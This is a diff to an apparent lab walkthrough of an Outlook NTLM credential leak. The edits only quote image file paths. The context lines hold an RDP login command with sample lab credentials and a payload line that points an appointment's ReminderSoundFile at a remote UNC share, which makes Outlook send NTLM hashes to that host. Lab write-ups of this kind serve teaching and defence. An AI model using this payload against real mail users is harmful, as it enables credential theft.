@@ -47,14 +47,14 @@ Command:
 xfreerdp /v:10.10.200.239 /u:Administrator /p:Password321 +clipboard
 ```
 
-![](./img/outlook_ntlm/Pasted image 20230608133244.png)
+![]("./img/outlook_ntlm/Pasted image 20230608133244.png")
 
 Once connected, we will start outlook.
 
-![](./img/outlook_ntlm/Pasted image 20230608133348.png)
+![]("./img/outlook_ntlm/Pasted image 20230608133348.png")
 
 
-![](./img/outlook_ntlm/Pasted image 20230608133744.png)
+![]("./img/outlook_ntlm/Pasted image 20230608133744.png")
 
 ![](./img/outlook_ntlm/Pasted image 20230608133822.png)
 
@@ -181,7 +181,7 @@ AppointmentItem.ReminderSoundFile = "\\10.8.78.131\nonexistent\sound.wav"
 
 ```
 
-![](./img/outlook_ntlm/Pasted image 20230608141505.png)
+![]("./img/outlook_ntlm/Pasted image 20230608141505.png")
 
 
 Tip: 
